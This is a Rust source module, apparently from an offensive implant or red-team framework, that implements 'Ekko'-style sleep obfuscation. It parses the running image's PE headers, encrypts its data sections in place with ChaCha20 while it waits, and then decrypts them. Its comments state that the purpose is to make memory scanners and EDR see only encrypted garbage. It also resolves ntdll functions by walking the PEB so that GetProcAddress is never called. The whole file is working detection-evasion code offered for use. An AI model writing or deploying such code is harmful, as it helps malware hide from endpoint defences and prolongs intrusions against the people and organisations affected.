#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # Sleep Obfuscation (Timer-Queue Evasion / Ekko) - Enhanced
//!
//! Encrypts data sections in RAM when sleeping.
//! Memory scanners see only encrypted garbage.
//!
//! ## Flow
//! 1. Find .data/.rdata section boundaries from PE headers
//! 2. `NtProtectVirtualMemory` - Change R → RW
//! 3. ChaCha20 stream cipher - Encrypt data in-place
//! 4. `NtWaitForSingleObject` - Sleep (data is encrypted)
//! 5. ChaCha20 - Decrypt data
//! 6. `NtProtectVirtualMemory` - Restore protection

use std::ffi::c_void;
use std::ptr;
use std::mem;
use log::{info, debug, error, warn};
use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
use rand::RngCore;

use crate::stealth::windows::stack_spoof;

// ============================================================================
// API TYPES
// ============================================================================

type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    process: isize, base: *mut *mut c_void, size: *mut usize, new: u32, old: *mut u32
) -> i32;
type FnNtWaitForSingleObject = unsafe extern "system" fn(handle: *mut c_void, alertable: i32, timeout: *mut i64) -> i32;
type FnNtCreateEvent = unsafe extern "system" fn(
    handle: *mut *mut c_void, access: u32, attr: *const c_void, event_type: i32, initial: i32
) -> i32;
type FnNtClose = unsafe extern "system" fn(handle: *mut c_void) -> i32;

const PAGE_READWRITE: u32 = 0x04;
const PAGE_READONLY: u32 = 0x02;
const EVENT_ALL_ACCESS: u32 = 0x1F0003;

// ============================================================================
// PE SECTION PARSING
// ============================================================================

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

/// Get list of encryptable sections (.data, .rdata only - NOT .text!)
unsafe fn get_encryptable_sections() -> Vec<(*mut u8, usize, u32)> {
    let mut sections = Vec::new();
    
    // Get image base from PEB
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    let image_base = *(peb.add(0x10) as *const *mut u8);
    
    // Parse PE headers
    let dos = image_base;
    if *(dos as *const u16) != 0x5A4D { return sections; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    
    // FileHeader.NumberOfSections at NT+6
    let num_sections = *((nt as usize + 6) as *const u16) as usize;
    // FileHeader.SizeOfOptionalHeader at NT+20
    let opt_header_size = *((nt as usize + 20) as *const u16) as usize;
    
    // Section headers start after optional header
    // NT sig (4) + FileHeader (20) + OptionalHeader (variable)
    let sections_start = nt.add(4 + 20 + opt_header_size) as *const ImageSectionHeader;
    
    for i in 0..num_sections {
        let section = &*sections_start.add(i);
        let name = std::str::from_utf8(&section.name).unwrap_or("");
        
        // Only encrypt DATA sections, NEVER code sections!
        // .data = global variables
        // .rdata = read-only data (strings, vtables, etc.)
        // .bss = uninitialized data
        // DO NOT encrypt .text, .code, or any executable section
        let is_data_section = name.starts_with(".data") 
            || name.starts_with(".rdata")
            || name.starts_with(".bss");
        
        // Skip executable sections (characteristic 0x20000000 = IMAGE_SCN_MEM_EXECUTE)
        let is_executable = (section.characteristics & 0x20000000) != 0;
        
        if is_data_section && !is_executable && section.virtual_size > 0 {
            let addr = image_base.add(section.virtual_address as usize);
            let size = section.virtual_size as usize;
            let old_protect = if name.starts_with(".rdata") { PAGE_READONLY } else { PAGE_READWRITE };
            
            debug!("[Ekko] Encryptable section: {} @ {:p}, size: 0x{:X}", 
                   name.trim_end_matches('\0'), addr, size);
            sections.push((addr, size, old_protect));
        }
    }
    
    sections
}

// ============================================================================
// CHACHA20 IN-PLACE ENCRYPTION
// ============================================================================

/// Encrypt/decrypt memory in-place using ChaCha20
fn chacha20_crypt(data: *mut u8, len: usize, key: &[u8; 32], nonce: &[u8; 12]) {
    let mut cipher = ChaCha20::new(key.into(), nonce.into());
    
    const CHUNK_SIZE: usize = 4096;
    let mut offset = 0;
    
    while offset < len {
        let remaining = len - offset;
        let chunk_len = remaining.min(CHUNK_SIZE);
        
        let chunk = unsafe { 
            std::slice::from_raw_parts_mut(data.add(offset), chunk_len) 
        };
        cipher.apply_keystream(chunk);
        offset += chunk_len;
    }
}

/// Generate cryptographically secure key and nonce
fn generate_key_nonce() -> ([u8; 32], [u8; 12]) {
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    
    // Use rand crate's cryptographically secure RNG
    let mut rng = rand::thread_rng();
    rng.fill_bytes(&mut key);
    rng.fill_bytes(&mut nonce);
    
    (key, nonce)
}

// ============================================================================
// SLEEP OBFUSCATION (ENHANCED EKKO - DATA SECTIONS ONLY)
// ============================================================================

/// Obfuscated sleep - encrypts DATA SECTIONS while sleeping
/// 
/// IMPORTANT: This encrypts .data/.rdata only, NOT the running code.
/// Encrypting .text would crash since the encryption function would encrypt itself.
pub unsafe fn obfuscated_sleep(duration_ms: u32) -> Result<(), String> {
    info!("[Ekko] Starting enhanced obfuscated sleep: {}ms", duration_ms);

    // 1. Resolve APIs via PEB walking (avoid GetProcAddress)
    let ntdll = stack_spoof::get_ntdll_base()
        .ok_or("[Ekko] Failed to get ntdll base")?;

    let fn_protect: FnNtProtectVirtualMemory = mem::transmute(
        stack_spoof::get_export_address(ntdll, b"NtProtectVirtualMemory\0")
            .ok_or("[Ekko] Failed to resolve NtProtectVirtualMemory")?
    );
    let fn_wait: FnNtWaitForSingleObject = mem::transmute(
        stack_spoof::get_export_address(ntdll, b"NtWaitForSingleObject\0")
            .ok_or("[Ekko] Failed to resolve NtWaitForSingleObject")?
    );
    let fn_create_event: FnNtCreateEvent = mem::transmute(
        stack_spoof::get_export_address(ntdll, b"NtCreateEvent\0")
            .ok_or("[Ekko] Failed to resolve NtCreateEvent")?
    );
    let fn_close: FnNtClose = mem::transmute(
        stack_spoof::get_export_address(ntdll, b"NtClose\0")
            .ok_or("[Ekko] Failed to resolve NtClose")?
    );

    // 2. Get encryptable sections (.data, .rdata - NOT .text!)
    let sections = get_encryptable_sections();
    if sections.is_empty() {
        warn!("[Ekko] No encryptable sections found, using simple sleep");
        std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
        return Ok(());
    }
    
    info!("[Ekko] Found {} encryptable data sections", sections.len());

    // 3. Generate cryptographically secure key and nonce
    let (key, nonce) = generate_key_nonce();
    debug!("[Ekko] ChaCha20 key generated (cryptographically secure)");

    // 4. Create event for timeout  
    let mut h_event: *mut c_void = ptr::null_mut();
    let status = fn_create_event(&mut h_event, EVENT_ALL_ACCESS, ptr::null(), 1, 0);
    if status != 0 {
        return Err(format!("[Ekko] NtCreateEvent failed: 0x{:X}", status));
    }

    // 5. Change protection and encrypt each data section
    let mut section_info: Vec<(*mut u8, usize, u32)> = Vec::new();
    
    for (addr, size, original_protect) in &sections {
        let mut base = *addr as *mut c_void;
        let mut region_size = *size;
        let mut old_protect: u32 = 0;
        
        // Change to RW so we can encrypt
        let status = fn_protect(-1, &mut base, &mut region_size, PAGE_READWRITE, &mut old_protect);
        if status != 0 {
            error!("[Ekko] NtProtect failed for {:p}: 0x{:X}", addr, status);
            continue;
        }
        
        // Encrypt this section
        chacha20_crypt(*addr, *size, &key, &nonce);
        section_info.push((*addr, *size, old_protect));
    }
    
    info!("[Ekko] {} data sections ENCRYPTED", section_info.len());

    // 6. Sleep (data is encrypted garbage - EDR sees nothing useful!)
    let mut timeout = -((duration_ms as i64) * 10000); // 100ns units, negative = relative
    fn_wait(h_event, 0, &mut timeout);

    // 7. Decrypt and restore each section
    for (addr, size, old_protect) in &section_info {
        // Decrypt
        chacha20_crypt(*addr, *size, &key, &nonce);
        
        // Restore original protection
        let mut base = *addr as *mut c_void;
        let mut region_size = *size;
        let mut temp: u32 = 0;
        let _ = fn_protect(-1, &mut base, &mut region_size, *old_protect, &mut temp);
    }
    
    debug!("[Ekko] Data sections DECRYPTED and restored");

    // 8. Cleanup
    fn_close(h_event);

    info!("[Ekko] Enhanced obfuscated sleep COMPLETE");
    Ok(())
}

/// Quick encrypted sleep (simplified API)
pub unsafe fn sleep_encrypted(seconds: u32) -> Result<(), String> {
    obfuscated_sleep(seconds * 1000)
}


